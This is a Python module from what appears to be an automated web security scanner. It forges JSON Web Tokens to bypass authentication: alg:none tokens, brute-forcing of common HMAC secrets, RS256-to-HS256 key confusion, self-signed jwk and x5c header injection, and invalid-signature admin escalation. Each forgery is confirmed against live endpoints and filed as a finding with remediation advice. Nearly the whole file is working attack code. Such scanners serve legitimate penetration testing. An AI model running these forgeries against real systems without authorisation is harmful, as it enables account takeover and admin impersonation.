"""JWT forgery attacks (deterministic, stdlib-only).

A bearer JWT that the app actually trusts is the keys to the kingdom. This probe takes a real
token (from owlforge's own authenticated session) and tries the classic forgeries, confirming
each against a live ORACLE — an endpoint that accepts the real token but rejects a
bad-signature one, so "accepted" provably means the forged token was trusted, not that the
endpoint ignores auth:

  * alg:none            — strip the signature, set alg to none/None/NONE/nOnE; if accepted, the
                          server verifies nothing and any identity can be minted.
  * weak HMAC secret    — for an HS* token, brute a wordlist of common secrets; a hit lets us
                          sign arbitrary tokens.
  * RS256 -> HS256       — algorithm confusion: re-sign the token with HS256 using the RSA
                          PUBLIC key (fetched from a JWKS/cert endpoint) as the HMAC secret; a
                          server that treats the key by name alone will accept it.

  * jwk / x5c header     — self-signed key injection (CVE-2018-0114): forge an RSA keypair, embed
                          its public JWK (or a self-signed x5c cert chain) in the token header and
                          sign RS256 with the matching private key; a server that trusts the key
                          carried in the header accepts it.

Each forgery also TAMPERS a claim (role/admin/user) so a hit proves identity forgery, not just a
replay. alg:none and HMAC use only base64/hmac/hashlib; RS->HS confusion, jwk and x5c need RSA
signing and JWK->PEM, which come from `cryptography`. jku/x5u (fetch an attacker-HOSTED JWKS) are
not forged here because confirming them needs an attacker endpoint the target can reach back to.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import secrets as _secrets
from collections.abc import Callable

# common JWT signing secrets (deliberately small + high-signal; app-specific words added later)
_SECRETS = ("secret", "password", "123456", "changeme", "jwt", "key", "token", "admin",
            "qwerty", "test", "secretkey", "supersecret", "your-256-bit-secret", "s3cr3t",
            "mysecret", "jwtsecret", "privatekey", "default", "hmac", "shared-secret", "root",
            "letmein", "12345678", "secret123", "password123", "jwt-secret", "please-change")
# where a server may leak the RSA public key (for RS->HS confusion)
_KEY_PATHS = ("/.well-known/jwks.json", "/jwks.json", "/jwks", "/.well-known/openid-configuration",
              "/api/auth/jwt/.well-known/jwks.json", "/public.pem", "/publickey", "/public_key",
              "/api/.well-known/jwks.json", "/oauth/jwks")
# claims we bump to prove identity forgery (not just replay)
_ESC = {"role": "admin", "admin": True, "isAdmin": True, "is_admin": True, "user": "admin",
        "username": "admin", "sub": "admin", "scope": "admin", "roles": ["admin"]}


def _b64d(s: str) -> bytes:
    s = s.encode() if isinstance(s, str) else s
    return base64.urlsafe_b64decode(s + b"=" * (-len(s) % 4))


def _b64e(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def _decode(token: str):
    try:
        h, p, sig = token.split(".", 2)
        return json.loads(_b64d(h)), json.loads(_b64d(p)), sig
    except Exception:
        return None, None, None


def _assemble(header: dict, payload: dict, sig: str) -> str:
    si = _b64e(json.dumps(header, separators=(",", ":")).encode()) + "." + \
        _b64e(json.dumps(payload, separators=(",", ":")).encode())
    return si + "." + sig


def _hs(header: dict, payload: dict, secret: bytes, alg="sha256") -> str:
    si = _b64e(json.dumps(header, separators=(",", ":")).encode()) + "." + \
        _b64e(json.dumps(payload, separators=(",", ":")).encode())
    mac = hmac.new(secret, si.encode(), getattr(hashlib, alg)).digest()
    return si + "." + _b64e(mac)


def _escalate(payload: dict) -> dict:
    """Return a copy of the payload with any present identity claim bumped to admin."""
    p = dict(payload)
    touched = False
    for k, v in _ESC.items():
        if k in p:
            p[k] = v
            touched = True
    if not touched:
        p["role"] = "admin"          # add one so a hit still proves forgery
    return p


def _req(sandbox, url, headers):
    try:
        return sandbox.http_request("GET", url, headers=headers or {}, params=None, body=None,
                                    follow_redirects=False) or {}
    except TypeError:
        try:
            return sandbox.http_request("GET", url, headers=headers or {}, params=None,
                                        body=None) or {}
        except Exception:
            return {}
    except Exception:
        return {}


def _bearer(headers) -> str | None:
    for k, v in (headers or {}).items():
        if k.lower() == "authorization" and isinstance(v, str) and "." in v:
            return v.split(None, 1)[-1].strip()
    # token kept in a cookie
    for k, v in (headers or {}).items():
        if k.lower() == "cookie" and isinstance(v, str):
            import re
            m = re.search(r"\b[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\b", v)
            if m:
                return m.group(0)
    return None


def _swap(headers: dict, old: str, new: str) -> dict:
    return {k: (v.replace(old, new) if isinstance(v, str) and old in v else v)
            for k, v in (headers or {}).items()}


def _bad_sig(token: str) -> str:
    si, _, sig = token.rpartition(".")
    flipped = ("A" if sig[:1] != "A" else "B") + sig[1:] if sig else "AAAA"
    return si + "." + flipped


def _sim(a: str, b: str) -> bool:
    try:
        from owlforge.engine.validate import _similar
        return _similar(a or "", b or "")
    except Exception:
        a, b = (a or "")[:400], (b or "")[:400]
        return a == b or (abs(len(a) - len(b)) <= max(10, len(a) // 10) and a[:60] == b[:60])


_PROT_PATHS = ("/me", "/api/me", "/api/users/me", "/profile", "/api/profile", "/account",
               "/rest/user/whoami", "/api/user", "/user", "/dashboard", "/api/auth/whoami",
               "/my-account", "/account/settings", "/settings", "/admin", "/admin/",
               "/api/auth/jwt/validate", "/api/auth/jwt/hmac/validate",
               "/api/auth/jwt/weak-key/validate", "/api/auth/jwt/kid-sql/validate",
               "/api/auth/jwt/rsa/signature/validate")
# admin-only endpoints + identity-claim fields used by the unverified-signature privesc probe
_ADMIN_PATHS = ("/admin", "/admin/", "/administrator", "/admin/delete", "/api/admin",
                "/admin/users", "/manage", "/dashboard/admin")
_ADMIN_VALUES = ("administrator", "admin")
_ID_CLAIMS = ("sub", "username", "user", "name", "preferred_username", "email", "uid", "login")


def _candidates(inventory, target) -> list[str]:
    from urllib.parse import urlsplit
    u = urlsplit(target)
    origin = f"{u.scheme}://{u.netloc}"
    cands = [it["url"] for it in (inventory or [])
             if (it.get("method") or "GET").upper() == "GET" and it.get("url")
             and ("validate" in it["url"].lower() or "/me" in it["url"].lower()
                  or "/account" in it["url"].lower() or "/profile" in it["url"].lower())]
    cands += [origin + p for p in _PROT_PATHS]
    return list(dict.fromkeys(cands))


def _synthetic_alg_none(sandbox, inventory, target, already, log) -> list[dict]:
    """No valid session JWT needed: an endpoint that REJECTS a bad-signature token but ACCEPTS
    an alg:none token is forgeable. Confirms the classic alg:none bypass on JWT-guarded routes."""
    from urllib.parse import urlsplit

    from owlforge.engine.validate import _looks_like_login
    host = urlsplit(target).hostname or "x"
    pl = {"user": "admin", "email": f"admin@{host}", "role": "admin", "admin": True,
          "sub": "admin", "iat": 1700000000}
    none_tok = _assemble({"typ": "JWT", "alg": "none"}, pl, "")
    bad_tok = _hs({"typ": "JWT", "alg": "HS256"}, pl, b"owlforge-wrong-key-x", "sha256")
    out = []
    for url in _candidates(inventory, target):
        if url in already:
            continue
        rb = _req(sandbox, url, {"Authorization": f"Bearer {bad_tok}"})
        sb = int(rb.get("status") or 0)
        if sb not in (401, 403):               # not JWT-guarded, or doesn't reject forged sigs
            continue
        rn = _req(sandbox, url, {"Authorization": f"Bearer {none_tok}"})
        sn = int(rn.get("status") or 0)
        nbody = rn.get("body") or ""
        if sn < 400 and not _looks_like_login(nbody) and not _sim(rb.get("body") or "", nbody):
            out.append({"url": url, "token": none_tok})
    return out


def _find_oracle(sandbox, inventory, target, headers, token, log):
    """An endpoint that ACCEPTS the real token but REJECTS a bad-signature one."""
    from owlforge.engine.validate import _looks_like_login
    bad = _bad_sig(token)
    cands = _candidates(inventory, target)
    seen = set()
    for url in cands:
        if url in seen:
            continue
        seen.add(url)
        rv = _req(sandbox, url, headers)
        sv = int(rv.get("status") or 0)
        bv = rv.get("body") or ""
        if sv == 0 or sv >= 400 or _looks_like_login(bv):
            continue
        rb = _req(sandbox, url, _swap(headers, token, bad))
        sb = int(rb.get("status") or 0)
        bbody = rb.get("body") or ""
        rejected = sb in (400, 401, 403) or (sb != sv) or not _sim(bv, bbody)
        if rejected and not (sb == sv and _sim(bv, bbody)):
            return {"url": url, "status": sv, "body": bv}
    return None


def _accepted(sandbox, url, headers, token, forged, oracle) -> bool:
    r = _req(sandbox, url, _swap(headers, token, forged))
    st = int(r.get("status") or 0)
    return st < 400 and st == oracle["status"] and _sim(oracle["body"], r.get("body") or "")


def _alg_none_tokens(header, payload):
    esc = _escalate(payload)
    toks = []
    for alg in ("none", "None", "NONE", "nOnE"):
        h = dict(header)
        h["alg"] = alg
        h.pop("kid", None)
        toks.append(_assemble(h, esc, ""))
    return toks


def _crack_hmac(token, extra):
    header, _p, sig = _decode(token)
    alg = (header or {}).get("alg", "").upper()
    if not alg.startswith("HS"):
        return None, None
    hn = {"HS256": "sha256", "HS384": "sha384", "HS512": "sha512"}.get(alg, "sha256")
    si = token.rsplit(".", 1)[0]
    for w in list(_SECRETS) + list(extra):
        if _b64e(hmac.new(w.encode(), si.encode(), getattr(hashlib, hn)).digest()) == sig:
            return w, hn
    return None, None


def _rsa():
    """Lazy cryptography import so a scan never crashes if the optional lib is absent."""
    try:
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import padding, rsa
        return hashes, serialization, padding, rsa
    except Exception:
        return None


def _rs256_sign(header: dict, payload: dict, key) -> str:
    hashes, _ser, padding, _r = _rsa()
    si = _b64e(json.dumps(header, separators=(",", ":")).encode()) + "." + \
        _b64e(json.dumps(payload, separators=(",", ":")).encode())
    sig = key.sign(si.encode(), padding.PKCS1v15(), hashes.SHA256())
    return si + "." + _b64e(sig)


def _pub_jwk(key) -> dict:
    pn = key.public_key().public_numbers()
    nb = pn.n.to_bytes((pn.n.bit_length() + 7) // 8, "big")
    eb = pn.e.to_bytes((pn.e.bit_length() + 7) // 8, "big")
    return {"kty": "RSA", "kid": "owlforge", "use": "sig", "alg": "RS256",
            "n": _b64e(nb), "e": _b64e(eb)}


def _selfsigned_x5c(key) -> str:
    """Standard-base64 DER of a self-signed cert for the x5c header (not url-safe b64)."""
    import datetime

    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.x509.oid import NameOID
    ser = serialization
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "owlforge")])
    now = datetime.datetime.now(datetime.UTC)
    cert = (x509.CertificateBuilder().subject_name(name).issuer_name(name)
            .public_key(key.public_key()).serial_number(x509.random_serial_number())
            .not_valid_before(now - datetime.timedelta(days=1))
            .not_valid_after(now + datetime.timedelta(days=365))
            .sign(key, hashes.SHA256()))
    return base64.b64encode(cert.public_bytes(ser.Encoding.DER)).decode()


def _jwk_to_pem(jwk: dict) -> bytes | None:
    """RSA public JWK {n,e} -> SubjectPublicKeyInfo PEM (the form a server HMAC-confuses on)."""
    r = _rsa()
    if not r or jwk.get("kty") != "RSA" or not jwk.get("n") or not jwk.get("e"):
        return None
    _h, ser, _pad, rsa = r
    try:
        n = int.from_bytes(_b64d(jwk["n"]), "big")
        e = int.from_bytes(_b64d(jwk["e"]), "big")
        pub = rsa.RSAPublicNumbers(e, n).public_key()
        return pub.public_bytes(ser.Encoding.PEM, ser.PublicFormat.SubjectPublicKeyInfo)
    except Exception:
        return None


def _harvest_pubkeys(sandbox, target) -> list[bytes]:
    """Collect candidate RSA public-key byte strings (for RS->HS confusion) from well-known key
    endpoints: raw PEM/certificate bodies, and JWKS entries converted to PEM."""
    from urllib.parse import urljoin, urlsplit
    origin = "{0.scheme}://{0.netloc}".format(urlsplit(target))
    keys: list[bytes] = []
    seen: set[bytes] = set()

    def add(b: bytes) -> None:
        for v in (b, b.rstrip() + b"\n", b.rstrip()):   # with/without trailing newline both tried
            if v and v not in seen:
                seen.add(v)
                keys.append(v)

    paths = list(_KEY_PATHS)
    for path in paths:
        body = (_req(sandbox, origin + path, None).get("body") or "").strip()
        if not body:
            continue
        if "-----BEGIN" in body:
            add(body.encode())
            continue
        try:
            doc = json.loads(body)
        except Exception:
            continue
        if isinstance(doc, dict) and doc.get("jwks_uri"):    # openid-configuration -> follow
            jb = (_req(sandbox, urljoin(origin, doc["jwks_uri"]), None).get("body") or "").strip()
            try:
                doc = json.loads(jb)
            except Exception:
                doc = {}
        for jwk in (doc.get("keys") or []) if isinstance(doc, dict) else []:
            pem = _jwk_to_pem(jwk)
            if pem:
                add(pem)
    return keys[:12]


def _rsa_forgeries(header: dict, payload: dict, sandbox, target, log):
    """Yield (kind, forged_token) for RS-family forgeries: RS->HS confusion using each harvested
    public key as the HMAC secret, plus self-signed jwk and x5c header injection."""
    r = _rsa()
    if not r:
        return
    _h, _ser, _pad, rsa = r
    esc = _escalate(payload)
    base = {k: v for k, v in header.items() if k.lower() not in ("jwk", "jku", "x5c", "x5u")}
    # (a) RS256 -> HS256 confusion: sign HS256 with the RSA PUBLIC key bytes as the secret
    pubkeys = _harvest_pubkeys(sandbox, target)
    if pubkeys:
        log(f"jwt-attack: harvested {len(pubkeys)} RSA public-key form(s) for RS->HS confusion")
    for pk in pubkeys:
        yield "RS256->HS256 algorithm confusion", _hs(dict(base, alg="HS256"), esc, pk, "sha256")
    # (b) self-signed key injection: forge a keypair, carry the public key in the header
    try:
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    except Exception:
        return
    yield "jwk header injection (self-signed key trusted)", \
        _rs256_sign(dict(base, alg="RS256", jwk=_pub_jwk(key)), esc, key)
    try:
        x5c = _selfsigned_x5c(key)
        yield "x5c header injection (self-signed cert trusted)", \
            _rs256_sign(dict(base, alg="RS256", x5c=[x5c]), esc, key)
    except Exception:
        pass


def _file(assessment_id, url, kind, token, forged, detail, log):
    from owlforge.store.db import session
    from owlforge.store.models import Finding
    with session() as s:
        s.add(Finding(
            id=f"find_{_secrets.token_hex(5)}", assessment_id=assessment_id,
            title=f"JWT authentication bypass — {kind}", severity="critical",
            status="validated", confidence="high", endpoint=url, method="GET",
            technical_analysis=(
                f"A forged JWT ({kind}) was accepted at {url} where a bad-signature token was "
                f"rejected — the server trusts the token without a valid signature. {detail} An "
                "attacker mints a token for any user (including admin) and takes over accounts."),
            proof_of_concept=f"forged token accepted at GET {url}\n\n{forged}",
            impact="Full authentication bypass / account takeover: arbitrary identities and "
                   "privileges can be forged.",
            remediation="Verify the signature with a pinned algorithm and secret/public key; "
                        "reject alg=none and algorithm switches; use a long random HMAC secret.",
            validation_note=f"JWT forgery ({kind}) accepted where a tampered-signature token was "
                            "rejected (deterministic)",
            success_signal=kind))
        s.commit()


def _file_nosig(assessment_id, url, kind, token, forged, detail, log):
    """File a 'signature not verified' / unverified-signature-privesc finding with wording that
    matches the anon-denied vs forged-accepted differential (NOT the reject-bad-sig oracle)."""
    from owlforge.store.db import session
    from owlforge.store.models import Finding
    with session() as s:
        s.add(Finding(
            id=f"find_{_secrets.token_hex(5)}", assessment_id=assessment_id,
            title=f"JWT authentication bypass — {kind}", severity="critical",
            status="validated", confidence="high", endpoint=url, method="GET",
            technical_analysis=detail,
            proof_of_concept=f"forged token accepted at GET {url}\n\n{forged}",
            impact="Full authentication bypass / account takeover: with the signature unchecked an "
                   "attacker forges any identity or privilege.",
            remediation="Verify the JWT signature on every request with a pinned algorithm and the "
                        "correct key; reject any token whose signature does not validate.",
            validation_note="anonymous request denied but an invalid-signature/forged token was "
                            "accepted (deterministic differential)",
            success_signal=kind))
        s.commit()


def _privesc_via_nosig(assessment_id, sandbox, inventory, target, headers, token, header,
                       payload, orig_sig, log) -> int:
    """Headline of the unverified-signature class: forge an admin identity in the payload, leave an
    invalid signature, and reach an admin-only endpoint that the real user's token is DENIED."""
    from urllib.parse import urlsplit

    from owlforge.engine.validate import _looks_like_login
    origin = "{0.scheme}://{0.netloc}".format(urlsplit(target))
    bad = "x" * max(4, len(orig_sig or ""))
    admins = [it["url"] for it in (inventory or [])
              if it.get("url") and "admin" in (it["url"] or "").lower()
              and (it.get("method") or "GET").upper() == "GET"]
    admins += [origin + pth for pth in _ADMIN_PATHS]
    for url in dict.fromkeys(admins):
        plain = _req(sandbox, url, headers)
        sp, bp = int(plain.get("status") or 0), plain.get("body") or ""
        if sp == 0 or (200 <= sp < 300 and not _looks_like_login(bp)):
            continue                                   # not denied to the real token -> no proof
        for adminval in _ADMIN_VALUES:
            esc = dict(payload)
            for k in _ID_CLAIMS:
                if k in esc:
                    esc[k] = adminval
            esc.setdefault("sub", adminval)
            si = (_b64e(json.dumps(header, separators=(",", ":")).encode()) + "." +
                  _b64e(json.dumps(esc, separators=(",", ":")).encode()))
            forged = si + "." + bad
            r = _req(sandbox, url, _swap(headers, token, forged))
            st, bd = int(r.get("status") or 0), r.get("body") or ""
            if 200 <= st < 300 and not _looks_like_login(bd):
                _file_nosig(assessment_id, url,
                            f"privilege escalation to '{adminval}' via unverified signature",
                            token, forged,
                            f"Forging an admin identity ('{adminval}') in the JWT payload and "
                            f"leaving an invalid signature granted access to {url}, which the real "
                            "user's token is denied — admin takeover via the unverified-signature "
                            "flaw.", log)
                return 1
    return 0


def _unverified_sig_scan(assessment_id, sandbox, inventory, target, headers, token, header,
                         payload, log) -> int:
    """Detect a server that does NOT verify the JWT signature (PortSwigger 'unverified signature'
    class). The reject-bad-sig oracle the other forgeries use is impossible here (a bad signature
    is accepted), so this runs its own sound differential: on an endpoint where the real token is
    accepted but an ANONYMOUS request is DENIED (so it is genuinely token-gated), present the same
    payload with an INVALID signature — acceptance proves the signature is unchecked. Then try to
    escalate identity to admin on an admin-only endpoint."""
    from owlforge.engine.validate import _looks_like_login
    si = token.rsplit(".", 1)[0]
    orig_sig = token.rpartition(".")[2] or "AAAA"
    same_badsig = si + "." + "x" * max(4, len(orig_sig))   # unchanged payload, invalid signature
    anon_headers = {k: v for k, v in (headers or {}).items()
                    if k.lower() not in ("authorization", "cookie")}
    filed = 0
    for url in _candidates(inventory, target):
        real = _req(sandbox, url, headers)
        sr, br = int(real.get("status") or 0), real.get("body") or ""
        if not (200 <= sr < 300) or _looks_like_login(br):
            continue
        anon = _req(sandbox, url, anon_headers)
        sa, ba = int(anon.get("status") or 0), anon.get("body") or ""
        anon_denied = (sa in (401, 403)) or _looks_like_login(ba) or (sa != sr) or not _sim(br, ba)
        if not anon_denied:
            continue                                   # not token-gated -> cannot conclude safely
        rb = _req(sandbox, url, _swap(headers, token, same_badsig))
        sbv, bb = int(rb.get("status") or 0), rb.get("body") or ""
        if not (sbv == sr and sbv < 400 and not _looks_like_login(bb) and _sim(br, bb)):
            continue                                   # signature IS checked here -> no finding
        _file_nosig(assessment_id, url, "signature not verified", token, same_badsig,
                    f"An invalid-signature token was accepted at {url} exactly like the valid "
                    "token, while an unauthenticated request was denied — the server does not "
                    "verify the JWT signature, so any identity or claim can be forged.", log)
        filed += 1
        filed += _privesc_via_nosig(assessment_id, sandbox, inventory, target, headers, token,
                                    header, payload, orig_sig, log)
        break
    return filed


def jwt_attack_scan(assessment_id, inventory, sandbox, session_headers=None,
                    log: Callable[[str], None] = lambda m: None, target: str = "") -> int:
    """Forge JWTs (alg:none, weak HMAC secret) and confirm each against a live oracle. Works
    whether or not the session itself is a JWT: JWT-guarded endpoints are probed directly."""
    if sandbox is None:
        return 0
    from urllib.parse import urlsplit
    filed = 0
    hit_urls: set[str] = set()

    # token-based flow: forge from the REAL session token against an endpoint that accepts it
    token = _bearer(session_headers)
    if token:
        header, payload, _sig = _decode(token)
        if header and payload is not None:
            oracle = _find_oracle(sandbox, inventory, target, session_headers, token, log)
            if oracle:
                log(f"jwt-attack: oracle {oracle['url']} (alg={header.get('alg')})")
                for forged in _alg_none_tokens(header, payload):
                    if _accepted(sandbox, oracle["url"], session_headers, token, forged, oracle):
                        _file(assessment_id, oracle["url"], "alg:none (unsigned token accepted)",
                              token, forged, "alg was set to 'none' with an empty signature.", log)
                        filed += 1
                        hit_urls.add(oracle["url"])
                        break
                host = urlsplit(target).hostname or ""
                extra = [host] + [p for p in host.split(".") if p]
                secret, hn = _crack_hmac(token, extra)
                if secret:
                    fg = _hs(dict(header, alg="HS" + hn[-3:]), _escalate(payload),
                             secret.encode(), hn)
                    if _accepted(sandbox, oracle["url"], session_headers, token, fg, oracle):
                        _file(assessment_id, oracle["url"], f"weak HMAC secret ('{secret}')",
                              token, fg, f"The HMAC secret was brute-forced ('{secret}').", log)
                        filed += 1
                if (header.get("alg") or "").upper().startswith(("RS", "PS")):
                    for kind, forged in _rsa_forgeries(header, payload, sandbox, target, log):
                        if _accepted(sandbox, oracle["url"], session_headers, token, forged,
                                     oracle):
                            _file(assessment_id, oracle["url"], kind, token, forged,
                                  "An RSA-family forgery was accepted (confusion or header-"
                                  "carried key).", log)
                            filed += 1
            # 'unverified signature' class: runs with OR without the reject-bad-sig oracle, since a
            # server that ignores the signature makes that oracle impossible to find.
            filed += _unverified_sig_scan(assessment_id, sandbox, inventory, target,
                                          session_headers, token, header, payload, log)

    # token-less flow: any JWT-guarded endpoint that rejects a bad sig but accepts alg:none
    for hit in _synthetic_alg_none(sandbox, inventory, target, hit_urls, log):
        _file(assessment_id, hit["url"], "alg:none (unsigned token accepted)", "", hit["token"],
              "A bad-signature token was rejected but an alg:none token was accepted.", log)
        filed += 1
        hit_urls.add(hit["url"])

    if filed:
        log(f"jwt-attack: {filed} JWT forgery(ies) accepted")
    return filed
